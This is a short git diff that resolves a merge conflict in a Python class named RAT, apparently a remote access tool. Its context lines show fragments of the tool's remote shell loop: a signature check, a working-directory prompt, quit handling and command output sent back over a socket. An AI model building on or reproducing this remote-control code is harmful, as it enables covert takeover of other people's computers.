@@ -222,7 +222,6 @@ class RAT:
 				if(data == cls.SIG):
 					cls.FLAG = True
 					cls.send("\n" + os.getcwd() + "> ")
-<<<<<<< HEAD
 
 				# check for quit
 				if(data == 'quit' or data == 'terminate'):
@@ -248,14 +247,7 @@ class RAT:
 				stdoutput += "\n" + os.getcwd() + "> "
 				stdoutput = stdoutput.decode('gbk').encode('utf-8')
 				cls.send(stdoutput)
-=======
-				
-				## TODO ##
-				"""
-					Add received command flags conditions handler
-				"""
-				#if()
->>>>>>> 33777a5a41114f80b0547c944175fae6664155d6
+
 
 			except socket.error as e:
 				# Connection refused
